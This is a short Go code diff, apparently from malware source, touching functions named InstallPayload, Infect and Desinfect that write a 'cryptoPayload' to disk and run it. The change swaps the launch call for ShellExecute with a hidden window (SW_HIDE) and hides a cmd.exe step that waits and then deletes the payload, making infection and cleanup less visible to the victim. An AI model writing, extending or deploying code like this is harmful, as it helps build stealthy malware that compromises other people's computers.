@@ -26,7 +26,7 @@ func InstallPayload(cryptoPayloadBytes []byte) error {
     if err != nil {
         return errors.Wrap(pkg, "failed to write payload", err)
     }
-    err = win.LaunchProcess(false, `"`+cryptoPayload+`"`)
+    err = win.ShellExecute("open", `"`+cryptoPayload+`"`, "", win.SW_HIDE)
     return errors.WrapIfNotNil(pkg, "failed to launch payload", err)
 }
 
@@ -68,7 +68,7 @@ func Infect() (bool, error) {
 }
 
 func Desinfect() error {
-    err := win.LaunchProcess(false, `cmd.exe /c "ping -n 5 & del "` + cryptoPayload + `""`)
+    err := win.ShellExecute("open", "cmd.exe", `/c "ping -n 10 localhost & del "` + cryptoPayload + `""`, win.SW_HIDE)
     return errors.WrapIfNotNil(pkg, "failed to desinfect", err)
 }
 
